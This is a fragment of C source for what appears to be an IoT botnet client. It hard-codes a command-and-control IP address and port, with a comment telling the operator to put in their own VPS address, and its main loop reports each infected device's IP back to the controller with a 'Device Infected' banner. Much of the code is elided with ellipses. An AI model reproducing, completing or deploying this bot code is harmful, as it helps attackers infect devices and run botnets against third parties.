...
#include "scankill.c"
  ...
  Change 217.61.113.124 to your vps ip!!!!!!

  */

unsigned char *cncip = "209.97.189.40";
int cncport = 1994;
...
int main(int argc, unsigned char * argv[]) {
  ...
  while (1) {
    ...
    sockprintf(mainCommSock, "\x1b[1;31m\x1b[43mDevice Infected\x1b[40m\x1b[0m \x1b[1;37m---\x1b[1;33m>    \x1b[1;37m[\x1b[1;33m%s\x1b[1;37m]  \x1b[0m", (char *)inet_ntoa(ourIP), (char *)VERSION);
    char commBuf[4096];
    int got = 0;
    int i = 0;
